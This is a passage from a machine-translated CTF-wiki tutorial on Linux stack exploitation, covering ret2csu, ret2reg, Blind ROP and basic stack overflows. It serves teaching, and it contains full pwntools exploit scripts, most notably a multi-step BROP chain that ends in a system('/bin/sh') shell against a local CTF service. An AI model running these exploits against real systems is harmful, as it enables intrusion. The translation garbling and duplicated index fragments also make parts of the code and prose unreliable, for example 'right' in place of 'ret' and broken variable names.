the tail code. Control rdx, rsi, edi with the code in the middle section. In fact, the tail of libc_csu_init can control other registers by offset. Among them, 0x000000000040061A is the normal starting address, can see that we can control the rbp register at 0x000000000040061f, and can control the rsi register at 0x0000000000400621. And if you want to understand this part in depth, you need to have a more thorough understanding of each field in the assembly instructions. as follows. ` asm gef\u27a4 x/5i 0x000000000040061A 0x40061a <__libc_csu_init+90>: pop rbx 0x40061b <__libc_csu_init+91>: pop rbp 0x40061c <__libc_csu_init+92>: pop r12 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 gef\u27a4 x/5i 0x000000000040061b 0x40061b <__libc_csu_init+91>: pop rbp 0x40061c <__libc_csu_init+92>: pop r12 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 gef\u27a4 x/5i 0x000000000040061A+3 0x40061d <__libc_csu_init+93>: pop rsp 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right gef\u27a4 x/5i 0x000000000040061e 0x40061e <__libc_csu_init+94>: pop r13 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop gef\u27a4 x/5i 0x000000000040061f 0x40061f <__libc_csu_init+95>: pop rbp 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop gef\u27a4 x/5i 0x0000000000400620 0x400620 <__libc_csu_init+96>: pop r14 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] gef\u27a4 x/5i 0x0000000000400621 0x400621 <__libc_csu_init+97>: pop rsi 0x400622 <__libc_csu_init+98>: pop r15 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop gef\u27a4 x/5i 0x000000000040061A+9 0x400623 <__libc_csu_init+99>: pop rdi 0x400624 <__ libc_csu_init + 100>: right 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 <__libc_csu_fini>: repz ret ### Title - 2016 XDCTF pwn100 - 2016 Huashan Cup SU_PWN ### Reference reading - http://wooyun.jozxing.cc/static/drops/papers-7551.html - http://wooyun.jozxing.cc/static/drops/binary-10638.html ## ret2reg ### Principle 1. Check which register value points to the overflow buffer space when the overflow function returns. 2. Then decompile the binary, look for the call reg or jmp reg command, and set the EIP to the instruction address. 3. Inject the shellcode into the space pointed to by reg (you need to make sure that the space is executable, but it is usually on the stack) ## BROP ### basic introduction BROP (Blind ROP) was presented by Andrea Bittau of Standford in 2014. The relevant research results were published in Oakland 2014. The title of the paper is **Hacking Blind**. The following is the author&#39;s corresponding paper and slides, and the author&#39;s corresponding introduction. - [paper] (http://www.scs.stanford.edu/brop/bittau-brop.pdf) - [slide] (http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf) BROP is an execution flow that hijacks a program without attacking the program under the source code or binary file of the corresponding application. ### Attack conditions 1. The source program must have a stack overflow vulnerability so that an attacker can control the program flow. 2. The server-side process restarts after a crash, and the restarted process has the same address as the previous address (that is, even if the program has ASLR protection, it only works when the program is initially started). Currently, server applications such as nginx, MySQL, Apache, and OpenSSH are compatible with this feature. ### Attack principle Currently, most applications will open ASLR, NX, Canary protection. Here we explain how to bypass these protections in BROP and how to attack them. #### The basic idea In BROP, the basic following ideas are as follows - Determine the stack overflow length - Violent enumeration - Stack Reading - Get data on the stack to leak canaries, as well as ebp and return address. - Blind ROP - Find enough gadgets to control the parameters of the output function and call them, such as the common write function and the puts function. - Build the exploit - Use the output function to dump the program so that you can find more gadgets so you can write the final exploit. #### Stack overflow length You can enumerate directly from 1 violence until you find the program crashes. #### Stack Reading As shown below, this is the current classic stack layout buffer|canary|saved fame pointer|saved returned address To get the canary and the variables that follow, we need to solve the first problem, how to get the length of the overflow, which can be obtained by continuous trial. Secondly, regarding the canary and the following variables, the method used is the same. Here we take canary as an example. Canary itself can be obtained by blasting, but it is obviously inefficient if you just enumerate all the values stupidly. It should be noted that the attack condition 2 indicates that the program itself does not change because of the crash, so the canary equivalent is the same each time. So we can blast by byte. As the paper shows, there are up to 256 possibilities per byte, so in the case of 32 bits, we need to blast up to 1024 times, and 64 bits can blast up to 2048 times. ![](./figure/stack_reading.png) #### Blind ROP ##### The basic idea The simplest way to execute the write function is to construct a system call. `` `asm pop rdi; right # socket pop rsi; ret # buffer pop rdx; ret # length pop rax; ret # write syscall number syscall But in general, such an approach is more difficult, because it is basically impossible to find a syscall address. . . We can get it by converting to find the way to write.","title":"gadget"},{"location":"pwn/linux/stackoverflow/medium-rop/#brop-gadgets","text":"First, at the end of libc_csu_init, a long list of gadgets, we can get the first two parameters of the write function call by offset. As shown in the text","title":"BROP gadgets"},{"location":"pwn/linux/stackoverflow/medium-rop/#find-a-call-write","text":"We can get the address of the write through the plt table.","title":"find a call write"},{"location":"pwn/linux/stackoverflow/medium-rop/#control-rdx","text":"It should be noted that rdx is just a variable we use to output the length of the program byte, as long as it is not 0. Generally speaking, the rdx in the program will not be zero. But in order to better control the program output, we still try to control this value. But in the program ` asm pop rdx; ret There are almost no such instructions. So how do we control the value of rdx? Here we need to explain that when strcmp is executed, rdx will be set to the length of the string to be compared, so we can find the strcmp function to control rdx. Then the next question, we can be divided into two Find gadgets Find a PLT form - write entry - strcmp entry ##### Looking for gadgets First, let&#39;s find a way to find gadgets. At this point, since we don&#39;t know what the program looks like, we can only guess the corresponding gadgets by simply setting the return address of the program to its own value. When we control the return address of the program, there are generally the following situations: - The program crashes directly - The program crashes after running for a while - The program keeps running without crashing In order to find reasonable gadgets, we can divide into the following two steps. ###### Looking for stop gadgets The so-called &quot;stop gadget&quot; generally refers to such a piece of code: when the program executes this code, the program will enter an infinite loop, so that the attacker can remain connected. &gt; In fact, the stop gadget does not have to be the same as above. Its basic purpose is to tell the attacker that the return address tested is a gadgets. The reason for finding stop gadgets is that when we guess a gadgtes, if we just lay it on the stack, the program will jump to the next address on the stack after executing the gadget. If the address is an illegal address, the program will crash. In this case, the attacker seems to be a simple crash. Therefore, the attacker would think that he did not execute any `useful gadget` in the process and gave up. The example is as follows ![](./figure/stop_gadget.png) However, if we have a `stop gadget`, then for every address we want to try, if it is a gadget, then the program won&#39;t crash. Next, just think of ways to identify these gadgets. ###### Identifying gadgets So how do we identify these gadgets? We can identify by stack layout and the behavior of the program. For easier introduction, here are the three addresses on the stack. - **Probe** - Probe, which is the code address we want to probe. In general, all 64-bit programs can be tried directly from 0x400000. If it is not successful, it is possible that the program has PIE protection enabled. If it is not good, it may be that the program is 32-bit. . I haven&#39;t really wanted to understand here, how can I quickly determine the number of remote bits. - **Stop** - The address of the stop gadget that will not crash the program. - **Trap** - an address that can cause the program to crash We can identify the instruction being executed by placing **Stop** and **Trap** in different orders on the stack. Because executing Stop means the program won&#39;t crash, executing Trap means the program will crash immediately. Here are a few examples - probe,stop,traps(traps,traps,...) - We can find a gadget that does not pop the stack, such as if the program crashes or not (** if the program crashes directly at the probe) - right - xor eax,eax; ret - probe,trap,stop,traps - We can find a gadget that just pops up a stack variable through such a layout. Such as - pop rax; right - pop rdi; right - probe, trap, trap, trap, trap, trap, trap, stop, traps - We can use this layout to find a gadget that pops up 6 stack variables, which is a gadget similar to a brop gadget. **There is a problem with the original text. For example, if you encounter an address that just pops a stack variable, it will not crash. **In general, you will encounter two interesting places. - plt will not collapse, - _start will not collapse, which is equivalent to re-execution of the program. The reason for putting a trap behind each layout is to be able to recognize that when the instruction executed at the corresponding address of our probe skips the stop, the program crashes immediately. However, even then, it is still difficult to identify which register the given gadget is operating on. However, it is important to note that the 6 registers of gadgets are popped up to the BROP, which is not often seen in the program. So, if we find such gadgets, then there is a great possibility that this gadgets are brop gadgets. In addition, this gadgets can also generate gadgets such as pop rsp by misplacement, which can make the program crash as a sign to identify this gadgets. In addition, according to our previous ret2libc_csu_init, we can know that the address minus 0x1a will get its previous gadgets. Can be used to call other functions. Need to pay attention to is that the probe may be a stop gadget, we have to check it, how to check it? We just need to make all the content behind it a trap address. Because if it is a stop gadget, the program will execute normally, otherwise it will crash. It seems very interesting. ##### Looking for PLT As shown in the following figure, the plt table of the program has a relatively regular structure, and each plt entry is 16 bytes. Moreover, at the 6-byte offset of each entry, it is the parsing path of the function corresponding to the entry, that is, when the program first executes the function, the path is executed to parse the function&#39;s got address. ![](./figure/brop_plt.png) In addition, for most plt calls, it is generally not easy to crash, even with strange parameters. So, if we find a series of code segments of length 16 that don&#39;t crash the program, then we have some reason to believe that we have encountered a plt table. In addition, we can also determine whether we are in the middle of the plt entry or at the beginning by offsetting 6 bytes before and after. ##### Control rdx When we find the plt table, below, we should find a way to control the value of rdx, then how to confirm the location of strcmp? Need to say in advance that not all programs will call the strcmp function, so without calling the strcmp function, we have to use other methods to control the value of rdx. Here is the case where the strcmp function is used in the program. Previously, we have found the gadgets for brop, so we can control the first two parameters of the function. At the same time, we define the following two addresses - readable, readable address. - bad, illegal address, not accessible, say 0x0. Then if we control the parameters passed as a combination of these two addresses, the following four situations will occur. - strcmp(bad,bad) - strcmp(bad,readable) - strcmp(readable,bad) - strcmp(readable,readable) Only the last format will the program execute normally. **Note**: In the absence of PIE protection, the 64-bit program&#39;s ELF file has 7 non-zero bytes at 0x400000. So how do we do it specifically? One straightforward method is to scan each plt entry from start to finish, but this is more troublesome. We can choose one of the following methods - Slow path using plt entries - and use the address of the slow path of the next entry to override the return address In this way, we do not have to control the corresponding variables back and forth. Of course, we may also happen to find the strncmp or strcasecmp functions, which have the same effect as strcmp. ##### Looking for output functions Look for the output function to find both write and puts. Generally look for the puts function now. However, for the convenience of introduction, first introduce how to find write. ###### Looking for write@plt When we can control the three parameters of the write function, we can traverse all the plt tables again, and find the corresponding function according to the output of the write function. It should be noted that one of the more troublesome things here is that we need to find the value of the file descriptor. In general, we have two ways to find this value. - Use rop chain, and make the file descriptors corresponding to each rop different - Open multiple connections at the same time, and we use a relatively high number to try. have to be aware of is - By default, a process can only open up to 1024 file descriptors. - The posix standard file descriptor value per application is always the current minimum available value. Of course, we can also choose to look for the puts function. ###### Looking for puts@plt Looking for the puts function (here we are looking for plt), we naturally need to control the rdi parameters. Above, we have found the brop gadget. Then, we can get the corresponding gadgets according to the brop gadget offset 9 (followed by ret2libc_csu_init). At the same time, in the case that the program has not yet turned on PIE protection, 0x400000 is the head of the ELF file, and its content is \\x7fELF. So we can judge based on this. In general, its payload is as follows payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) #### Attack Summary At this point, the attacker can already control the output function, so the attacker can output more content of the .text section in order to find more suitable gadgets. At the same time, the attacker can also find some other functions, such as dup2 or execve functions. Generally, the attacker will do the next thing at this time. - Redirect socket output to input and output - Look for the address of &quot;/bin/sh&quot;. In general, it is best to find a writable memory and use the write function to write the string to the appropriate address. - Execve the execve to get the shell, and the execve is not necessarily in the plt table. At this point, the attacker needs to find a way to execute the system call. ### Examples Here we take [HCTF2016&#39;s issuer missing] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop) as an example. The basic idea is as follows #### Determine stack overflow length ```python def getbufferflow_length(): i = 1 while 1: try: sh = remote('127.0.0.1', 9999) sh.recvuntil('WelCome my friend,Do you know password?\\n') sh.send(i * 'a') output = sh.recv() sh.close() if not output.startswith('No password'): return i - 1 else: i += 1 except EOFError: sh.close() return i - 1 Based on the above, we can determine that the length of the stack overflow is 72. At the same time, according to the echo information, it can be found that the program does not open canary protection, otherwise, there will be corresponding error content. So we don't need to perform stack reading.","title":"control rdx"},{"location":"pwn/linux/stackoverflow/medium-rop/#looking-for-stop-gadgets","text":"The search process is as follows def get_stop_addr ( length ): addr = 0x400000 while 1 : try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) sh . sendline ( payload ) sh . recv () sh . close () print 'one success addr: 0x %x ' % ( addr ) return addr except Exception : addr += 1 sh . close () Here we directly try 64-bit programs without PIE, because it is generally like this, if it is turned on, then follow the open method, and found a lot, I chose a seemingly return Address to the source program one success stop gadget addr: 0x4006b6","title":"Looking for stop gadgets"},{"location":"pwn/linux/stackoverflow/medium-rop/#identifying-brop-gadgets","text":"Below, we get the corresponding brop gadgets address according to the principle described above. Constructed as follows, get_brop_gadget is to get a possible brop gadget, the latter check_brop_gadget is for checking. def get_brop_gadget ( length , stop_gadget , addr ): try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) + p64 ( 0 ) * 6 + p64 ( stop_gadget ) + p64 ( 0 ) * 10 sh . sendline ( payload ) content = sh . recv () sh . close () print content # stop gadget returns memory if not content . startswith ( 'WelCome' ): return False return True except Exception : sh . close () return False def check_brop_gadget ( length , addr ): try : sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( addr ) + 'a' * 8 * 10 sh . sendline ( payload ) content = sh . recv () sh . close () return False except Exception : sh . close () return True ##length = getbufferflow_length() length = 72 ##get_stop_addr(length) stop_gadget = 0x4006b6 addr = 0x400740 while 1 : print hex ( addr ) if get_brop_gadget ( length , stop_gadget , addr ): print 'possible brop gadget: 0x %x ' % addr if check_brop_gadget ( length , addr ): print 'success brop gadget: 0x %x ' % addr break addr += 1 In this way, we basically got the bopp gadgets address 0x4007ba","title":"Identifying brop gadgets"},{"location":"pwn/linux/stackoverflow/medium-rop/#determine-the-putsplt-address","text":"According to the above, we can construct the following payload to get the acquisition. payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget) The specific function is as follows def get_puts_addr ( length , rdi_ret , stop_gadget ): addr = 0x400000 while 1 : print hex ( addr ) sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'A' * length + p64 ( rdi_ret ) + p64 ( 0x400000 ) + p64 ( addr ) + p64 ( stop_gadget ) sh . sendline ( payload ) try : content = sh . recv () if content . startswith ( ' \\x7f ELF' ): print 'find puts@plt addr: 0x %x ' % addr return addr sh . close () addr += 1 except Exception : sh . close () addr += 1 Finally, according to the structure of plt, choose 0x400560 as puts@plt","title":"Determine the puts@plt address"},{"location":"pwn/linux/stackoverflow/medium-rop/#leaking-putsgot-address","text":"After we can call the puts function, we can leak the address of the puts function, and then get the libc version, so as to get the relevant system function address and /bin/sh address to get the shell. We leaked 0x1000 bytes from 0x400000, which is enough to contain the plt part of the program. code show as below def leak ( length , rdi_ret , puts_plt , leak_addr , stop_gadget ): sh = remote ( '127.0.0.1' , 9999 ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( leak_addr ) + p64 ( puts_plt ) + p64 ( stop_gadget ) sh . recvuntil ( 'password? \\n ' ) sh . sendline ( payload ) try : data = sh . recv () sh . close () try : data = data [: data . index ( \" \\n WelCome\" )] except Exception : date = data if data == \"\" : data = ' \\x00 ' return data except Exception : sh . close () return None ##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006b6 ## brop_gadget = find_brop_gadget (length, stop_gadget) brop_gadget = 0x4007ba rdi_ret = bridge_gadget + 9 ##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget) puts_plt = 0x400560 addr = 0x400000 result = \"\" while addr < 0x401000 : print hex ( addr ) data = leak ( length , rdi_ret , puts_plt , addr , stop_gadget ) if data is None : continue else : result += data addr + = len ( data ) with open ( 'code' , 'wb' ) as f : f . write ( result ) Finally, we write the leaked content to a file. It should be noted that if the leak is \"\", then we have encountered '\\x00', because puts is the output string, the string is terminated with '\\x00'. Then use ida to open the binary mode, first change the base address of the program to 0x400000 in edit->segments->rebase program, and then find the offset 0x560, as follows ` asm seg000: 0000000000400560 db 0FFh seg000: 0000000000400561 pcs 25h; % seg000: 0000000000400562 db 0B2h; seg000: 0000000000400563 db 0Ah seg000:0000000000400564 db 20h seg000: 0000000000400565 db 0 Then press c to convert the data here into assembly instructions as follows `` `asm seg000: 0000000000400560; -------------------------------------------------- ------------------------- seg000: 0000000000400560 jmp qword for cs: 601018h seg000: 0000000000400566; -------------------------------------------------- ------------------------- seg000:0000000000400566 push 0 seg000:000000000040056B jmp loc_400550 seg000:000000000040056B ; --------------------------------------------------------------------------- This shows that the address of puts@got is 0x601018.","title":"Leaking puts@got address"},{"location":"pwn/linux/stackoverflow/medium-rop/#program-utilization","text":"##length = getbufferflow_length() length = 72 ##stop_gadget = get_stop_addr(length) stop_gadget = 0x4006b6 ## brop_gadget = find_brop_gadget (length, stop_gadget) brop_gadget = 0x4007ba rdi_ret = bridge_gadget + 9 ##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget) puts_plt = 0x400560 ##leakfunction(length, rdi_ret, puts_plt, stop_gadget) puts_got = 0x601018 sh = remote ( '127.0.0.1' , 9999 ) sh . recvuntil ( 'password? \\n ' ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( puts_got ) + p64 ( puts_plt ) + p64 ( stop_gadget ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n WelCome' , drop = True ) puts_addr = u64 ( data . ljust ( 8 , & #39;x00&#39;)) libc = LibcSearcher ( 'puts' , puts_addr ) libc_base = puts_addr - libc . dump ( 'puts' ) system_addr = libc_base + libc . dump ( 'system' ) binsh_addr = libc_base + libc . dump ( 'str_bin_sh' ) payload = 'a' * length + p64 ( rdi_ret ) + p64 ( binsh_addr ) + p64 ( system_addr ) + p64 ( stop_gadget ) sh . sendline ( payload ) sh . interactive ()","title":"Program Utilization"},{"location":"pwn/linux/stackoverflow/medium-rop/#reference-reading","text":"http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/ http://bobao.360.cn/learning/detail/3694.html http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/","title":"Reference reading"},{"location":"pwn/linux/stackoverflow/stack-intro/","text":"\u6808\u4ecb\u7ecd \u00b6 Basic stack introduction \u00b6 The stack is a typical data structure of Last in First Out. Its operations mainly include push and pop operations, as shown in the following figure (Wikipedia). Both operations operate on the top of the stack, and of course, it also has a stack. ![Basic stack operation] (./figure/Data_stack.png) High-level languages are converted to assembler at runtime, making full use of this data structure while the assembler is running. Each program has a virtual address space at runtime, and a part of it is the stack corresponding to the program, which is used to save function call information and local variables. In addition, common operations are also stacking and popping. It should be noted that the stack of the ** program is growing from the high address of the process address space to the low address. function call stack \u00b6 Be sure to take a closer look at the following article to learn the basic function call stack. [C language function call stack (1)] ( http://www.cnblogs.com/clover-toeic/p/3755401.html ) [C language function call stack (2)] ( http://www.cnblogs.com/clover-toeic/p/3756668.html ) Here is another diagram of the register. It should be noted that 32-bit and 64-bit programs have the following simple differences. x86 Function parameter above the function return address x64 System V AMD64 ABI (used in Linux, FreeBSD, macOS, etc.) The first six integer or pointer parameters are stored in the RDI, RSI, RDX, RCX, R8 and R9 registers , if there are more The parameters will be saved on the stack. The memory address cannot be greater than 0x00007FFFFFFFFFFF, 6 bytes long , otherwise an exception will be thrown. Reference reading \u00b6 a tap Calling conventions for different C++ compilers and operating systems, Agner Fog","title":"Stack Introduction"},{"location":"pwn/linux/stackoverflow/stack-intro/#_1","text":"","title":"\u6808\u4ecb\u7ecd"},{"location":"pwn/linux/stackoverflow/stack-intro/#basic-stack-introduction","text":"The stack is a typical data structure of Last in First Out. Its operations mainly include push and pop operations, as shown in the following figure (Wikipedia). Both operations operate on the top of the stack, and of course, it also has a stack. ![Basic stack operation] (./figure/Data_stack.png) High-level languages are converted to assembler at runtime, making full use of this data structure while the assembler is running. Each program has a virtual address space at runtime, and a part of it is the stack corresponding to the program, which is used to save function call information and local variables. In addition, common operations are also stacking and popping. It should be noted that the stack of the ** program is growing from the high address of the process address space to the low address.","title":"Basic stack introduction"},{"location":"pwn/linux/stackoverflow/stack-intro/#function-call-stack","text":"Be sure to take a closer look at the following article to learn the basic function call stack. [C language function call stack (1)] ( http://www.cnblogs.com/clover-toeic/p/3755401.html ) [C language function call stack (2)] ( http://www.cnblogs.com/clover-toeic/p/3756668.html ) Here is another diagram of the register. It should be noted that 32-bit and 64-bit programs have the following simple differences. x86 Function parameter above the function return address x64 System V AMD64 ABI (used in Linux, FreeBSD, macOS, etc.) The first six integer or pointer parameters are stored in the RDI, RSI, RDX, RCX, R8 and R9 registers , if there are more The parameters will be saved on the stack. The memory address cannot be greater than 0x00007FFFFFFFFFFF, 6 bytes long , otherwise an exception will be thrown.","title":"function call stack"},{"location":"pwn/linux/stackoverflow/stack-intro/#reference-reading","text":"a tap Calling conventions for different C++ compilers and operating systems, Agner Fog","title":"Reference reading"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/","text":"Stack overflow principle \u00b6 Introduction \u00b6 Stack overflow refers to the number of bytes written by the program to a variable in the stack that exceeds the number of bytes requested by the variable itself, thus causing the value of the variable in the stack adjacent to it to be changed. This problem is a specific buffer overflow vulnerability, similar to heap overflow, bss segment overflow and other overflow methods. A stack overflow vulnerability can cause a program to crash, and in addition, an attacker can control the execution flow of the program. In addition, we are not difficult to find that the basic premise of stack overflow is The program must write data to the stack. The size of the data written is not well controlled. Basic example \u00b6 The most typical stack overflow exploit is to cover the return address of the program to the address controlled by the attacker. Of course, you need to ensure that the segment where the address is located has executable permissions . Below, we give a simple example: #include <stdio.h> #include <string.h> void success () { puts ( \"You Hava already controlled it.\" ); } void vulnerable () { char s [ 12 ]; gets ( s ); puts ( s ); return ; } int main ( int argc , char ** argv ) { vulnerable (); return 0 ; } The main purpose of this program is to read a string and output it. We want to control the program to execute the success function. We compile it with the following command \u279c stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example stack_example.c: In function \u2018vulnerable\u2019: stack_example.c:6:3: warning: implicit declaration of function \u2018gets\u2019 [ -Wimplicit-function-declaration ] gets ( s ) ; ^ /tmp/ccPU8rRA.o: In the function & #39;vulnerable&#39;: stack_example.c: ( .text+0x27 ) : \u8b66\u544a\uff1a the ` gets ' function is dangerous and should not be used. It can be seen that gets itself is a dangerous function. It never checks the length of the input string, but uses Enter to determine if the input is over, so it can easily cause the stack to overflow. > Historically, the Morris worm first worm exploited the dangerous function get to implement stack overflow. In the gcc compiler directive, -m32 refers to the generation of a 32-bit program; -fno-stack-protector refers to the stack overflow protection not being turned on, that is, no canary is generated. In addition, in order to introduce the basic use of stack overflow more conveniently, it is also necessary to disable PIE (Position Independent Executable) to avoid the disruption of the load base address. Different gcc versions have different default configurations for PIE. We can use the command gcc -v to view the default gcc switch status. If the --enable-default-pie parameter is present, it means that the PIE is enabled by default. You need to add the parameter -no-pie to the compile directive. After compiling successfully, you can check the compiled file with the checksec tool: \u279c stack-example checksec stack_example Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Referring to the PIE protection at compile time, there is also a mechanism for Address Space Distribution Randomization (ASLR) under the Linux platform. Simply put, even if the executable file has PIE protection enabled, you need to enable ASLR to actually disturb the base address. Otherwise, the program will still load a fixed base address (but not the base address of No PIE). We can control the ASLR startup by modifying /proc/sys/kernel/randomize_va_space . The specific options are 0, close ASLR, no randomization. The base addresses of the stack, heap, and .so are the same every time. 1, ordinary ASLR. The stack base address, the mmap base address, and the .so load base address are all randomized, but the heap base address is not randomized. 2, Enhanced ASLR, based on 1, adds randomization of the heap base address. We can use the echo 0 &gt; /proc/sys/kernel/randomize_va_space to turn off the ASLR of the Linux system. Similarly, you can configure the corresponding parameters. In order to reduce the complexity of subsequent exploits, we close ASLR here and close PIE at compile time. Of course, readers can also try different combinations of ASLR and PIE switches, and use IDA and its dynamic debugging function to observe the program address change (can also be successfully attacked when ASLR is closed and PIE is enabled). After confirming that the stack overflow and PIE protection are turned off, we use IDA to decompile the binary and view the vulnerable function. can be seen int vulnerable () { char s ; // [sp+4h] [bp-14h]@1 gets ( & s ); return puts ( & s ); } The length of the string distance ebp is 0x14, then the corresponding stack structure is +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp--->+-----------------+ | | | | | | | | | | | | s,ebp-0x14-->+-----------------+ And, we can get the address of success through IDA, its address is 0x0804843B. ` asm .text:0804843B success proc near .text:0804843B push ebp .text:0804843C mov ebp, esp .text:0804843E sub esp, 8 .text:08048441 sub esp, 0Ch .text:08048444 push offset s ; \"You Hava already controlled it.\" .text:08048449 call _puts .text:0804844E add esp, 10h .text: 08048451 .text:08048452 leave .text: 08048453 retn .text:08048453 success endp Then if we read the string is 0x14*'a'+'bbbb'+success_addr Then, since gets will read the carriage return, we can directly read all the strings, and cover the saved ebp to bbbb and the retaddr to success_addr. That is, the stack structure at this time is ```text +-----------------+ | 0x0804843B | +-----------------+ | . \\ t ebp--->+-----------------+ | | | | | | | | | | | | s,ebp-0x14-->+-----------------+ However, it should be noted that since in the computer's memory, each value is stored in bytes. In general, small-end storage is used, that is, the form of 0x0804843B in memory is \\x3b\\x84\\x04\\x08 However, we can't input these characters directly in the terminal. When the terminal inputs, \\, x, etc. also count as a single character. . So we need to find a way to enter \\x3b as a character. So at this point we need to use a wave of pwntools (about how to install and basic usage, please github), here the code using pwntools is as follows: ##coding=utf8 from pwn import * ## Constructing objects that interact with the program sh = process ( './stack_example' ) success_addr = 0x0804843b ## Constructing a payload payload = 'a' * 0x14 + 'bbbb' + p32 ( success_addr ) print p32 ( success_addr ) ## Send a string to the program sh . sendline ( payload ) ## Convert code interaction to manual interaction sh . interactive () Execute a wave of code to get \u279c stack-example python exp.py [ + ] Starting local process './stack_example' : pid 61936 x84 [ * ] Switching to interactive mode aaaaaaaaaaaaaaaaaaaabbbb ; \\ x84 \\ x0 You Hava already controlled it. [ * ] Got EOF while reading in interactive $ [ * ] Process './stack_example' stopped with exit code -11 ( SIGSEGV ) ( pid 61936 ) [ * ] Got EOF while sending in interactive You can see that we have indeed executed the success function. \u5c0f\u8ff0 \u00b6 The above example actually shows the more important steps in the stack overflow. Looking for dangerous functions \u00b6 By looking for dangerous functions, we quickly determine if the program is likely to have a stack overflow and, if so, where the stack overflows. Common dangerous functions are as follows Enter gets, read a line directly, ignoring '\\x00' scanf vscanf output sprintf string strcpy, string copy, encountered '\\x00' stop strcat, string splicing, encountered '\\x00' stop bcopy Determine the fill length \u00b6 This part is mainly to calculate the distance between the address we want to operate and the address we want to cover**. A common method of operation is to turn on IDA and calculate the offset based on its given address. General variables will have the following index modes The index relative to the stack base address can be obtained directly by looking at the EBP relative offset The index corresponding to the top pointer of the stack generally needs to be debugged, and then it will be converted to the first type. Direct address indexing is equivalent to directly giving an address. In general, we will have the following coverage requirements Override function return address , this time just look at EBP directly. Overwrites the contents of a variable on the stack , which requires more detailed calculations. Overwrites the contents of a variable in the bss section . Overwrite the contents of a specific variable or address based on actual implementation. The reason we want to cover an address is because we want to control the program execution flow directly or indirectly by overriding the address**. Reference reading \u00b6 stack buffer overflow http://bobao.360.cn/learning/detail/3694.html https://www.cnblogs.com/rec0rd/p/7646857.html","title":"Stack Overflow Principle"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#stack-overflow-principle","text":"","title":"Stack overflow principle"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#introduction","text":"Stack overflow refers to the number of bytes written by the program to a variable in the stack that exceeds the number of bytes requested by the variable itself, thus causing the value of the variable in the stack adjacent to it to be changed. This problem is a specific buffer overflow vulnerability, similar to heap overflow, bss segment overflow and other overflow methods. A stack overflow vulnerability can cause a program to crash, and in addition, an attacker can control the execution flow of the program. In addition, we are not difficult to find that the basic premise of stack overflow is The program must write data to the stack. The size of the data written is not well controlled.","title":"Introduction"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#basic-example","text":"The most typical stack overflow exploit is to cover the return address of the program to the address controlled by the attacker. Of course, you need to ensure that the segment where the address is located has executable permissions . Below, we give a simple example: #include <stdio.h> #include <string.h> void success () { puts ( \"You Hava already controlled it.\" ); } void vulnerable () { char s [ 12 ]; gets ( s ); puts ( s ); return ; } int main ( int argc , char ** argv ) { vulnerable (); return 0 ; } The main purpose of this program is to read a string and output it. We want to control the program to execute the success function. We compile it with the following command \u279c stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example stack_example.c: In function \u2018vulnerable\u2019: stack_example.c:6:3: warning: implicit declaration of function \u2018gets\u2019 [ -Wimplicit-function-declaration ] gets ( s ) ; ^ /tmp/ccPU8rRA.o: In the function & #39;vulnerable&#39;: stack_example.c: ( .text+0x27 ) : \u8b66\u544a\uff1a the ` gets ' function is dangerous and should not be used. It can be seen that gets itself is a dangerous function. It never checks the length of the input string, but uses Enter to determine if the input is over, so it can easily cause the stack to overflow. > Historically, the Morris worm first worm exploited the dangerous function get to implement stack overflow. In the gcc compiler directive, -m32 refers to the generation of a 32-bit program; -fno-stack-protector refers to the stack overflow protection not being turned on, that is, no canary is generated. In addition, in order to introduce the basic use of stack overflow more conveniently, it is also necessary to disable PIE (Position Independent Executable) to avoid the disruption of the load base address. Different gcc versions have different default configurations for PIE. We can use the command gcc -v to view the default gcc switch status. If the --enable-default-pie parameter is present, it means that the PIE is enabled by default. You need to add the parameter -no-pie to the compile directive. After compiling successfully, you can check the compiled file with the checksec tool: \u279c stack-example checksec stack_example Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Referring to the PIE protection at compile time, there is also a mechanism for Address Space Distribution Randomization (ASLR) under the Linux platform. Simply put, even if the executable file has PIE protection 